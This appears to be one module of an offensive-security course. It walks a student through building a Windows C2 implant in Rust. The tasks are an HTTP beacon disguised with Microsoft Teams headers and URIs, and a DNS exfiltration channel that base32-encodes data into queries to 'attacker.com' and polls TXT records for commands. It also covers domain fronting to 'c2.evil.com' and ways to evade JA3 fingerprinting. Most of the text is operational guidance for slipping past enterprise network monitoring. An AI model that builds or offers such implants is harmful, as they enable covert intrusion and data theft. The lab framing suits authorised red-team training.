# Module 27 — Traffic Obfuscation

## Concept

A C2 implant that communicates over plain HTTP to `evil.com` will be blocked on any decent enterprise network within minutes. Network sensors look at three independent signals:

| Signal | What it looks at | Defeated by |
|---|---|---|
| URI / hostname blocklists | Known bad domains and IP ranges | Domain fronting, domain generation |
| HTTP header fingerprinting | User-Agent, header order, custom headers | Malleable HTTP profiles |
| TLS fingerprinting (JA3) | ClientHello cipher suite + extensions | Matching a known-good JA3 hash |
| Protocol anomaly | Non-browser traffic on port 443 | Matching a real application's traffic shape |
| DNS telemetry | Unusual subdomain query patterns | Low-and-slow DNS exfiltration |
| Content inspection | HTTP body byte patterns | Encryption + compression |

This module covers **three complementary techniques**: malleable HTTP profiles, DNS C2, and (conceptually) domain fronting. Together they address the first four rows of the table.

---

## Technique A — Malleable HTTP Profiles

### Why it works

Network sensors that block C2 traffic typically operate on pattern matching: known bad User-Agents, missing headers that real browsers always send, suspicious URI shapes. A "malleable profile" makes your traffic look exactly like a specific real application by copying its headers, URI patterns, and request cadence.

Microsoft Teams is a useful target: it makes frequent short HTTPS requests to Microsoft-controlled hostnames, uses distinctive headers, and is allowed through almost every corporate firewall.

### What you need to replicate

Real Teams traffic includes:
- **User-Agent**: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) Teams/1.5.00.36771`
- **Header**: `X-MS-Client-Correlation-ID: <guid>` — a random GUID per session
- **Header**: `Client-Version: 27/1.0.0.2021011328` — client build version
- **URI shape**: `/v2/communications/calls/<call-id>` — looks like a Teams call check-in

Generating a random GUID is easy — four random hex segments separated by hyphens. The call-id can be similarly random.

---

## Task — Part A: Malleable HTTP Beacon

Implement `malleable_http_beacon(host: &str, port: u16)` in `src/main.rs`.

### Step 1 — Open a session with a spoofed User-Agent

```
WinHttpOpen(
    pszagentw: PCWSTR,                  // User-Agent string — used for ALL requests in this session
    dwaccesstype: WINHTTP_ACCESS_TYPE,   // WINHTTP_ACCESS_TYPE_DEFAULT_PROXY — honour system proxy settings
    pszproxyw: PCWSTR,                   // WINHTTP_NO_PROXY_NAME — NULL, not needed when using default
    pszproxybypassw: PCWSTR,             // WINHTTP_NO_PROXY_BYPASS — NULL
    dwflags: u32,                        // 0 — synchronous mode
) -> HINTERNET                           // NULL on failure; check is_invalid()
```

Convert the Teams User-Agent string to a wide string (`encode_wide` or the `w!` macro).

### Step 2 — Connect to the C2 host

```
WinHttpConnect(
    hsession: HINTERNET,      // session handle from Step 1
    pswzservername: PCWSTR,   // hostname or IP as wide string
    nserverport: u16,         // TCP port — 80 for HTTP, 443 for HTTPS
    dwreserved: u32,          // must be 0
) -> HINTERNET                 // NULL on failure
```

### Step 3 — Open a request with a Teams-shaped URI

Generate a URI of the form `/v2/communications/calls/<random-id>` where `random-id` looks like a hex GUID.

```
WinHttpOpenRequest(
    hconnect: HINTERNET,              // connection from Step 2
    pwszverb: PCWSTR,                 // HTTP method — w!("GET")
    pwszobjectname: PCWSTR,           // URI path — the Teams-shaped path you generated
    pwszversion: PCWSTR,              // NULL — defaults to HTTP/1.1
    pwszreferrer: PCWSTR,             // NULL — no Referer header
    ppwszaccepttypes: *const PCWSTR,  // NULL — accept anything
    dwflags: u32,                     // 0 for HTTP; WINHTTP_FLAG_SECURE for HTTPS
) -> HINTERNET                        // NULL on failure
```

### Step 4 — Inject custom headers

```
WinHttpAddRequestHeaders(
    hrequest: HINTERNET,    // request handle from Step 3
    lpszheaders: PCWSTR,    // header string — "HeaderName: value\r\n" — must end with \r\n
                            //   multiple headers can be separated with \r\n in one call
    dwheaderslength: u32,   // length in characters, or u32::MAX to measure automatically
    dwmodifiers: u32,       // WINHTTP_ADDREQ_FLAG_ADD — adds new headers, doesn't replace existing
) -> Result<()>
```

Add both `X-MS-Client-Correlation-ID` and `Client-Version`. Use a randomly generated GUID for the correlation ID.

### Step 5 — Send the request

```
WinHttpSendRequest(
    hrequest: HINTERNET,           // request handle from Step 3
    lpszheaders: PCWSTR,           // WINHTTP_NO_ADDITIONAL_HEADERS (NULL) — already added above
    dwheaderslength: u32,          // 0
    lpoptional: *const c_void,     // NULL — GET has no body
    dwoptionallength: u32,         // 0
    dwtotallength: u32,            // 0
    dwcontext: usize,              // 0 — not used in synchronous mode
) -> Result<()>

WinHttpReceiveResponse(
    hrequest: HINTERNET,     // request handle
    lpreserved: *mut c_void, // NULL — reserved
) -> Result<()>
```

---

## Technique B — DNS C2

### Why DNS

DNS works everywhere — it's allowed outbound through almost every firewall because without it nothing resolves. An attacker controls a domain and runs a custom authoritative DNS server. Queries for subdomains of that domain arrive at the server, where the subdomain is the exfiltrated data. Responses (TXT records) carry commands back.

### Encoding

DNS labels must be alphanumeric plus hyphens, max 63 characters. **Base32** (RFC 4648, alphabet `A-Z2-7`) maps arbitrary bytes to a safe label-compatible alphabet. Every 5 input bytes become 8 base32 characters.

Example:
```
input:   "run calc"         (8 bytes)
base32:  "OJQWC2LOMFRA====  (remove padding → OJQWC2LOMFRA)
query:   OJQWC2LOMFRA.attacker.com
```

A real C2 setup would split long data into multiple queries (DNS labels max 63 chars, names max 253 chars) and log them server-side.

---

## Task — Part B: DNS C2 Encoding

### Step 6 — Implement base32 encoding/decoding

Base32 alphabet: `A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 2 3 4 5 6 7` (indices 0–31).

Encoding algorithm:
1. Process 5 input bytes at a time → 40 bits → 8 base32 characters
2. For the final partial group, pad the bit stream with zero bits to reach a multiple of 5
3. Emit characters only for real bits — do **not** emit `=` padding (it's not a valid DNS label character)

Decoding is the reverse: map each character to its 5-bit value, accumulate bits, emit bytes whenever you have 8.

Implement `base32_encode(data: &[u8]) -> String` and `base32_decode(s: &str) -> Vec<u8>`.

Verify with a round-trip test before using the DNS functions.

### Step 7 — Implement `dns_exfil`

Split the base32-encoded string into 60-character chunks. For each chunk, issue a DNS A query for `<chunk>.<domain>`.

```
DnsQuery_A(
    pszname: PCSTR,                       // DNS name to query — e.g. "OJQWC2LO.attacker.com\0"
    wtype: u16,                           // DNS_TYPE_A (1) — we want an A lookup, not the answer
    options: u32,                         // DNS_QUERY_STANDARD (0) — standard resolution
    paextra: *mut DNS_ADDR_ARRAY,         // NULL — use system DNS servers
    ppqueryresults: *mut *mut DNS_RECORD, // out: linked list of returned records (may be NXDOMAIN)
    preserved: *mut c_void,               // NULL — reserved
) -> WIN32_ERROR                          // DNS_ERROR_RCODE_NAME_ERROR (9003) = NXDOMAIN — expected
```

After the call, if `ppqueryresults` is non-null, free it:
```
DnsFree(
    pdata: *mut c_void,  // cast ppqueryresults to *mut c_void
    freetype: DNS_FREE_TYPE, // DnsFreeRecordList (1)
)
```

You don't care about the response — NXDOMAIN is expected. The data was received by your server when the query was sent.

### Step 8 — Implement `dns_poll`

Query TXT records at `cmd.<domain>` to receive a command from the server.

```
DnsQuery_A(
    pszname: PCSTR,    // "cmd.attacker.com\0"
    wtype: u16,        // DNS_TYPE_TEXT (16) — TXT record
    options: u32,      // DNS_QUERY_STANDARD
    ...
)
```

Walk the returned `DNS_RECORD` linked list. Each record has a `.wType` field — check for `DNS_TYPE_TEXT`. The TXT data is in `.Data.TXT`:
```rust
// DNS_RECORD.Data.TXT.pStringArray is a *mut PWSTR
// .pStringArray[0] is the first string (PWSTR)
// Convert to Rust: PWSTR::to_string() or collect chars until null
```

Follow `.pNext` (a `*mut DNS_RECORD`) to walk the list. Stop when it's null.

Free the list with `DnsFree` after you've extracted the data.

---

## Concept — Domain Fronting

Domain fronting exploits how CDN providers (Cloudfront, Azure CDN, Fastly) route HTTPS traffic:

1. The TLS **SNI** field (visible to firewalls) contains a legitimate CDN hostname: `allowed.azureedge.net`
2. The HTTP **Host** header (inside the encrypted TLS tunnel, invisible to firewalls) contains your C2 server's domain: `c2.evil.com`
3. The CDN receives the request, reads the Host header, and forwards it to `c2.evil.com`

The firewall sees traffic to `allowed.azureedge.net` over TLS port 443 — a Microsoft CDN. It cannot see the inner Host header. The traffic blends into normal cloud-service traffic.

**Why it's hard to implement from scratch**: CDN providers have largely closed this by requiring SNI and Host to match their own domain. Modern domain fronting requires a CDN account and a specific configuration. It's more of an operational tradecraft topic than a coding exercise, which is why this module only explains it.

---

## Concept — JA3 Fingerprinting

Every TLS client has a "fingerprint" derived from the ClientHello message it sends during the TLS handshake. The JA3 algorithm hashes:
- TLS version
- Cipher suites (in order)
- Extensions (in order)
- Elliptic curves
- Elliptic curve point formats

The hash is 32 hex characters. Browsers, curl, Python's requests, and Rust's `rustls` all have different JA3 hashes. An EDR that logs JA3 hashes can identify that a process is not a browser even though it's on port 443.

Mitigation: use a TLS library where you control the cipher suite order. With `rustls`, you can customise the `ClientConfig` to match Chrome's or Firefox's exact cipher suite list, producing the same JA3 hash. This is outside the scope of a coding exercise here but worth being aware of.

---

## Acceptance Criteria

- [ ] `cargo build --target x86_64-pc-windows-gnu -p traffic-obfuscation` succeeds
- [ ] `malleable_http_beacon` sends a request with the correct User-Agent and custom headers (verify in Wireshark or a local proxy like mitmproxy)
- [ ] The URI path contains a `/v2/communications/calls/<id>` shaped path
- [ ] `base32_encode` / `base32_decode` round-trip is verified with an assert
- [ ] `dns_exfil` issues one DNS query per 60-char chunk (check with Wireshark on loopback or a DNS debug server)
- [ ] `dns_poll` returns `None` gracefully when the domain does not resolve (NXDOMAIN is not a panic)
- [ ] DnsQuery_A results are freed with DnsFree when non-null
- [ ] WinHttp handles are closed at the end of `malleable_http_beacon`

---

## Hints

- Use the `w!` macro from `windows::core` for wide string literals: `w!("GET")`. For runtime strings, use `encode_wide()` or build a `Vec<u16>` manually.
- For the random GUID in the correlation ID header, you can use a simple LFSR or just XOR a counter with a seed — it just needs to look like hex. No need for a real GUID library.
- `DnsQuery_A` is in `windows::Win32::NetworkManagement::Dns`. The feature flag is `Win32_NetworkManagement_Dns`.
- `DNS_RECORD` is a complex union. The `.Data` field is a union of all record types. Access it as `.Data.TXT` for TXT records. This is `unsafe`.
- Walking the `DNS_RECORD` list: `let mut p = ppqueryresults; while !p.is_null() { ... p = (*p).pNext; }`.
- WinHttp handles should be closed with `WinHttpCloseHandle` — match each `WinHttpOpen*` call with a close.
- The DNS exfil function won't need a real server for the exercise — the test just verifies the encoding round-trip and that queries are issued. Use `127.0.0.1` or a domain you control in the VM to capture actual DNS traffic.

---

## Submission

Paste `src/main.rs` and share a Wireshark capture (or mitmproxy log) showing the Teams-profile HTTP headers and the DNS queries from the exfil test.
